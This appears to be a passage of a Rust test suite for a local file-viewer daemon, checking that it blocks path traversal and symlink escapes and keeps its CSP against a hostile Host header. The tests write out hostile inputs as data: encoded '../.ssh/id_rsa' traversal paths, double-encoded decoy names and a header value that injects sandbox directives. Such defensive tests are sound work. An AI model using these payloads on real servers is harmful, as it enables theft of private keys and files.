        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
    }

    /// The attack: `proj/page.html` carries `<img src="../../.ssh/id_rsa">`,
    /// which the client turns into a root at the home directory. The daemon
    /// refuses that root, accepts the project root, and under the project
    /// mount `../.ssh/id_rsa` is a 404.
    #[tokio::test]
    async fn a_widened_root_is_refused_and_the_project_mount_cannot_reach_outside() {
        let f = fixture_with(true, Some("home"));
        let home = f.root.join("home");
        let proj = home.join("proj");
        let ssh = home.join(".ssh");
        fs::create_dir_all(proj.join("pages")).unwrap();
        fs::create_dir_all(proj.join("_shared")).unwrap();
        fs::create_dir_all(&ssh).unwrap();
        fs::write(ssh.join("id_rsa"), "FAKE-PRIVATE-KEY").unwrap();
        fs::write(proj.join("_shared/tokens.css"), "a{}").unwrap();
        let page = proj.join("pages/page.html");
        fs::write(&page, "<img src=\"../../../.ssh/id_rsa\">").unwrap();
        f.add_project("p1", &proj).await;

        // Home, and the dir between home and the project: both above the project.
        for root in [&home, &f.root, home.join("proj/..").as_path()] {
            let v = f.serve(root, &page).await;
            assert!(!v["ok"].as_bool().unwrap_or(true), "{root:?}: {v}");
        }
        let v = f.serve(&home, &page).await;
        assert!(
            v["error"]
                .as_str()
                .unwrap_or_default()
                .contains("above the project root"),
            "{v}"
        );
        assert!(!v.to_string().contains("FAKE-PRIVATE-KEY"));

        // The project root works, so ../_shared/tokens.css (inside it) still loads.
        let token = f.mount_for(&proj, &page).await;
        let (st, _, body) = f
            .get("GET", &format!("/__viewer/{token}/_shared/tokens.css"), &[])
            .await;
        assert_eq!((st, &body[..]), (StatusCode::OK, &b"a{}"[..]));
        // A root below the project (the page's own dir) works too.
        f.mount_for(&proj.join("pages"), &page).await;

        // Under the project mount, climbing out is a 404 in every spelling.
        for uri in [
            format!("/__viewer/{token}/../.ssh/id_rsa"),
            format!("/__viewer/{token}/%2e%2e/.ssh/id_rsa"),
            format!("/__viewer/{token}/pages/../../.ssh/id_rsa"),
            format!("/__viewer/{token}/%2e%2e%2f.ssh%2fid_rsa"),
        ] {
            let (st, _, body) = f.get("GET", &uri, &[]).await;
            assert_ne!(st, StatusCode::OK, "{uri}");
            assert!(
                !String::from_utf8_lossy(&body).contains("FAKE-PRIVATE-KEY"),
                "{uri}"
            );
        }
        let (st, _, _) = f
            .get("GET", &format!("/__viewer/{token}/.ssh/id_rsa"), &[])
            .await;
        assert_eq!(st, StatusCode::NOT_FOUND);
    }

    /// A page in no project may mount only its own directory; a project that
    /// is the whole home (or contains it) bounds nothing and is ignored.
    #[tokio::test]
    async fn a_page_in_no_project_cannot_widen_and_a_home_project_bounds_nothing() {
        let f = fixture_with(true, Some("home"));
        let home = f.root.join("home");
        let docs = home.join("docs/sub");
        fs::create_dir_all(&docs).unwrap();
        fs::write(home.join("docs/shared.css"), "x").unwrap();
        let page = docs.join("page.html");
        fs::write(&page, "<link href=\"../shared.css\">").unwrap();

        // No project at all: own directory only.
        f.mount_for(&docs, &page).await;
        let v = f.serve(&home.join("docs"), &page).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
        let v = f.serve(&home, &page).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");

        // A project registered at the home dir does not unlock widening.
        f.add_project("everything", &home).await;
        let v = f.serve(&home, &page).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
        let v = f.serve(&home.join("docs"), &page).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");

        // A real project beneath it does.
        f.add_project("docs", &home.join("docs")).await;
        f.mount_for(&home.join("docs"), &page).await;
        let v = f.serve(&home, &page).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
    }

    /// A root that does not contain the page is refused.
    #[tokio::test]
    async fn a_root_must_contain_the_page() {
        let f = fixture_with(true, Some("home"));
        let a = f.root.join("home/a");
        let b = f.root.join("home/b");
        fs::create_dir_all(&a).unwrap();
        fs::create_dir_all(&b).unwrap();
        fs::write(a.join("p.html"), "x").unwrap();
        let v = f.serve(&b, &a.join("p.html")).await;
        assert!(!v["ok"].as_bool().unwrap_or(true), "{v}");
    }

    #[test]
    fn check_root_unit() {
        let p = |s: &str| PathBuf::from(s);
        let projects = vec![p("/h/proj"), p("/h/proj/inner"), p("/h")];
        let home = p("/h");
        // `/h` is the home: ignored. The deepest remaining project bounds.
        assert_eq!(
            project_root_of(Path::new("/h/proj/inner/x/a.html"), &projects, Some(&home)),
            Some(p("/h/proj/inner"))
        );
        assert_eq!(
            project_root_of(Path::new("/h/other/a.html"), &projects, Some(&home)),
            None
        );
        let ok = |root: &str, file: &str| {
            check_root(Path::new(root), Path::new(file), &projects, Some(&home))
        };
        assert!(ok("/h/proj", "/h/proj/a/b.html").is_ok());
        assert!(ok("/h/proj/a", "/h/proj/a/b.html").is_ok());
        assert!(ok("/h", "/h/proj/a/b.html").is_err());
        assert!(ok("/h/proj/inner", "/h/proj/inner/b.html").is_ok());
        // Nested project: the deepest one bounds, so `/h/proj` is too high.
        assert!(ok("/h/proj", "/h/proj/inner/b.html").is_err());
        // No project: own directory only.
        assert!(ok("/h/other", "/h/other/a.html").is_ok());
        assert!(ok("/h", "/h/other/a.html").is_err());
        // The root must contain the file.
        assert!(ok("/h/proj/a", "/h/proj/b/c.html").is_err());
        // `/` is never a project.
        assert!(check_root(Path::new("/"), Path::new("/x/a.html"), &[p("/")], None).is_err());
    }

    /// A mount of an allowlisted parent that contains the daemon's data dir
    /// serves everything around it but not the data dir; and a file the
    /// allowlist no longer covers is refused on the next request.
    #[tokio::test]
    async fn per_request_path_guard_refuses_reserved_and_dropped_roots() {
        let f = fixture();
        fs::write(f.root.join("data").join("fs_roots.json"), "{\"secret\":1}").unwrap();
        fs::write(f.root.join("ok.txt"), "fine").unwrap();
        let token = f.mount(&f.root).await;

        let (st, _, body) = f
            .get("GET", &format!("/__viewer/{token}/ok.txt"), &[])
            .await;
        assert_eq!((st, &body[..]), (StatusCode::OK, &b"fine"[..]));

        let (st, _, body) = f
            .get("GET", &format!("/__viewer/{token}/data/fs_roots.json"), &[])
            .await;
        assert_eq!(st, StatusCode::FORBIDDEN);
        let body = String::from_utf8(body).unwrap();
        assert_eq!(body, "forbidden", "a refusal names neither path nor reason");

        // The double-encoded spelling of the same file is not a way around it.
        let (st, _, body) = f
            .get(
                "GET",
                &format!("/__viewer/{token}/data/fs_roots%2ejson"),
                &[],
            )
            .await;
        assert_ne!(st, StatusCode::OK);
        assert!(!String::from_utf8_lossy(&body).contains("secret"));

        // Shrink the allowlist after the mount was made: the mount keeps its
        // root but the file is now outside the allowlist.
        let other = tempfile::tempdir().unwrap();
        f.roots
            .add(&other.path().canonicalize().unwrap().to_string_lossy())
            .unwrap();
        f.roots.remove(&f.root.to_string_lossy()).unwrap();
        let (st, _, body) = f
            .get("GET", &format!("/__viewer/{token}/ok.txt"), &[])
            .await;
        assert_eq!(st, StatusCode::FORBIDDEN);
        assert_eq!(String::from_utf8(body).unwrap(), "forbidden");
    }

    /// Regression: the path was percent-decoded by the router and then again
    /// by `ServeDir`, so `lea%256b` (a decoy file literally named `lea%6b`)
    /// was checked as the decoy but served as the symlink `leak`.
    #[cfg(unix)]
    #[tokio::test]
    async fn double_encoded_decoy_cannot_reach_a_symlink_target() {
        let f = fixture();
        let www = f.root.join("www");
        fs::create_dir_all(&www).unwrap();
        // Outside the mount root (but inside the allowlist), and the data dir.
        fs::write(f.root.join("outside.txt"), "TOPSECRET-outside-mount").unwrap();
        fs::write(f.root.join("data").join("fs_roots.json"), "{\"secret\":1}").unwrap();
        std::os::unix::fs::symlink(f.root.join("outside.txt"), www.join("leak")).unwrap();
        std::os::unix::fs::symlink(
            f.root.join("data").join("fs_roots.json"),
            www.join("dbleak"),
        )
        .unwrap();
        fs::write(www.join("lea%6b"), "decoy").unwrap();
        fs::write(www.join("dble%61k"), "decoy2").unwrap();
        let token = f.mount(&www).await;

        // The symlinks themselves leave the mount root.
        for name in ["leak", "lea%6b", "dbleak"] {
            let (st, _, body) = f
                .get("GET", &format!("/__viewer/{token}/{name}"), &[])
                .await;
            // `lea%6b` decodes once to `leak` (the symlink): refused too.
            assert_eq!(st, StatusCode::NOT_FOUND, "{name}");
            assert!(!String::from_utf8_lossy(&body).contains("TOPSECRET"));
        }
        // `lea%256b` decodes once to the decoy's literal name and serves the decoy.
        let (st, _, body) = f
            .get("GET", &format!("/__viewer/{token}/lea%256b"), &[])
            .await;
        assert_eq!((st, &body[..]), (StatusCode::OK, &b"decoy"[..]));
        let (st, _, body) = f
            .get("GET", &format!("/__viewer/{token}/dble%2561k"), &[])
            .await;
        assert_eq!((st, &body[..]), (StatusCode::OK, &b"decoy2"[..]));
        // A triple-encoded spelling is just another (missing) literal name.
        let (st, _, _) = f
            .get("GET", &format!("/__viewer/{token}/lea%25256b"), &[])
            .await;
        assert_eq!(st, StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn range_requests_and_edge_cases() {
        let f = fixture();
        let sub = f.root.join("m");
        fs::create_dir_all(&sub).unwrap();
        let data: Vec<u8> = (0u8..100).collect();
        fs::write(sub.join("a.mp3"), &data).unwrap();
        let token = f.mount(&sub).await;
        let uri = format!("/__viewer/{token}/a.mp3");

        let range = |v: &'static str| {
            let f = &f;
            let uri = uri.clone();
            async move { f.get("GET", &uri, &[("range", v)]).await }
        };

        let (st, h, body) = range("bytes=0-9").await;
        assert_eq!(st, StatusCode::PARTIAL_CONTENT);
        assert_eq!(h[header::CONTENT_RANGE], "bytes 0-9/100");
        assert_eq!(body, &data[0..10]);

        let (st, h, body) = range("bytes=-10").await; // suffix
        assert_eq!(st, StatusCode::PARTIAL_CONTENT);
        assert_eq!(h[header::CONTENT_RANGE], "bytes 90-99/100");
        assert_eq!(body, &data[90..]);

        let (st, h, body) = range("bytes=90-").await; // open-ended
        assert_eq!(st, StatusCode::PARTIAL_CONTENT);
        assert_eq!(h[header::CONTENT_RANGE], "bytes 90-99/100");
        assert_eq!(body, &data[90..]);

        let (st, h, _) = range("bytes=95-500").await; // clamped past EOF
        assert_eq!(st, StatusCode::PARTIAL_CONTENT);
        assert_eq!(h[header::CONTENT_RANGE], "bytes 95-99/100");

        for unsatisfiable in ["bytes=100-", "bytes=200-300"] {
            let (st, h, _) = range(unsatisfiable).await;
            assert_eq!(st, StatusCode::RANGE_NOT_SATISFIABLE, "{unsatisfiable}");
            assert_eq!(h[header::CONTENT_RANGE], "bytes */100");
        }

        // Malformed / unsupported / multi (overlapping) ranges are ignored: a
        // full 200, never a 416 a media element cannot recover from.
        for ignored in [
            "bytes=abc",
            "items=0-1",
            "bytes=0-1,5-9",
            "bytes=0-20,10-30",
            "bytes=-",
            "bytes=5",
        ] {
            let (st, _, body) = range(ignored).await;
            assert_eq!(st, StatusCode::OK, "{ignored}");
            assert_eq!(body, data, "{ignored}");
        }

        // HEAD describes the full representation.
        let (st, h, body) = f.get("HEAD", &uri, &[]).await;
        assert_eq!(st, StatusCode::OK);
        assert_eq!(h[header::CONTENT_LENGTH], "100");
        assert!(body.is_empty());
        assert_eq!(h[header::ACCEPT_RANGES], "bytes");
    }

    #[tokio::test]
    async fn html_head_get_and_range_describe_the_same_representation() {
        let f = fixture();
        let sub = f.root.join("h");
        fs::create_dir_all(sub.join("dir")).unwrap();
        let html = "<!doctype html><html><head></head><body>0123456789</body></html>";
        fs::write(sub.join("index.html"), html).unwrap();
        fs::write(
            sub.join("dir").join("index.html"),
            "<html><head></head><body>d</body></html>",
        )
        .unwrap();
        let token = f.mount(&sub).await;
        let uri = format!("/__viewer/{token}/index.html");

        let (st, h, body) = f.get("GET", &uri, &[]).await;
        assert_eq!(st, StatusCode::OK);
        assert_eq!(
            h[header::CONTENT_LENGTH].to_str().unwrap(),
            body.len().to_string()
        );

        let (st, hh, hbody) = f.get("HEAD", &uri, &[]).await;
        assert_eq!(st, StatusCode::OK);
        assert!(hbody.is_empty());
        assert_eq!(hh[header::CONTENT_LENGTH], h[header::CONTENT_LENGTH]);

        // A Range on HTML is ignored: the same injected 200, not raw 206 bytes.
        let (st, _, rbody) = f.get("GET", &uri, &[("range", "bytes=0-9")]).await;
        assert_eq!(st, StatusCode::OK);
        assert_eq!(rbody, body);

        // `dir` -> `dir/` keeps the `/__viewer/<token>` prefix; `dir/` serves its index.
        let (st, h, _) = f.get("GET", &format!("/__viewer/{token}/dir"), &[]).await;
        assert_eq!(st, StatusCode::TEMPORARY_REDIRECT);
        assert_eq!(h[header::LOCATION], format!("/__viewer/{token}/dir/"));
        let (st, _, body) = f.get("GET", &format!("/__viewer/{token}/dir/"), &[]).await;
        assert_eq!(st, StatusCode::OK);
        assert!(String::from_utf8(body).unwrap().contains(">d<"));
    }

    /// The CSP must never be dropped, whatever `Host` says.
    #[tokio::test]
    async fn hostile_host_header_cannot_weaken_the_csp() {
        let f = fixture();
        let sub = f.root.join("s");
        fs::create_dir_all(&sub).unwrap();
        fs::write(sub.join("x.txt"), "x").unwrap();
        let token = f.mount(&sub).await;
        for host in [
            "evil.test; sandbox allow-same-origin allow-scripts",
            "a b",
            "h\u{e9}st",
        ] {
            let uri = format!("/__viewer/{token}/x.txt");
            let req = Request::builder()
                .uri(&uri)
                .header(
                    header::HOST,
                    HeaderValue::from_bytes(host.as_bytes()).unwrap(),
                )
                .body(Body::empty())
                .unwrap();
            let resp = f.app.clone().oneshot(req).await.unwrap();
            assert_eq!(resp.status(), StatusCode::OK, "{host}");
            let csp = resp.headers()[header::CONTENT_SECURITY_POLICY]
                .to_str()
                .unwrap();
            assert!(csp.starts_with("sandbox allow-scripts;"), "{host}: {csp}");
            assert!(!csp.contains("allow-same-origin"), "{host}: {csp}");
            assert!(!csp.contains("evil.test"), "{host}: {csp}");
        }
    }

    #[test]
    fn mounts_expire_when_idle_and_are_capped() {
        let svc = ViewerService::with_ttl(Duration::from_millis(40));
        let (_, t) = svc.register(PathBuf::from("/tmp"), None);
        assert!(svc.has_token(&t) && svc.get_mount(&t).is_some());
        std::thread::sleep(Duration::from_millis(80));
        assert!(!svc.has_token(&t), "idle mount survived its ttl");
        assert!(svc.get_mount(&t).is_none());

        // Use refreshes the clock.
        let svc = ViewerService::with_ttl(Duration::from_millis(120));
        let (_, t) = svc.register(PathBuf::from("/tmp"), None);
        for _ in 0..4 {
            std::thread::sleep(Duration::from_millis(50));
            assert!(svc.get_mount(&t).is_some());
        }

        // Cap: the least recently used mount is evicted first.
        let svc = ViewerService::new();
        let (_, first) = svc.register(PathBuf::from("/tmp"), None);
        for _ in 0..MAX_MOUNTS {
            svc.register(PathBuf::from("/tmp"), None);
        }
        assert!(!svc.has_token(&first));
        assert!(svc.mounts.len() <= MAX_MOUNTS);
    }

    #[test]
    fn token_carries_principal_prefix_in_simple_form() {
        let pid = uuid::Uuid::now_v7();
        let svc = ViewerService::new();
        let (url, token) = svc.register(PathBuf::from("/tmp"), Some(pid));
        assert!(token.starts_with(&format!("{}_", pid.simple())));
        assert_eq!(url, format!("/__viewer/{token}/"));
    }

    #[test]
    fn range_sanitizer_keeps_only_a_single_bytes_range() {
        let check = |v: &str| {
            let mut h = HeaderMap::new();
            h.insert(header::RANGE, HeaderValue::from_str(v).unwrap());
            sanitize_range(&mut h);
            h.contains_key(header::RANGE)
        };
        for ok in ["bytes=0-9", "bytes=5-", "bytes=-5", "bytes=0-0"] {
            assert!(check(ok), "{ok}");
        }
        for bad in [
            "bytes=",
            "bytes=-",
            "bytes=a-b",
            "bytes=0-1,3-4",
            "items=0-1",
            "0-9",
            "bytes=1",
        ] {
            assert!(!check(bad), "{bad}");
        }
    }
}
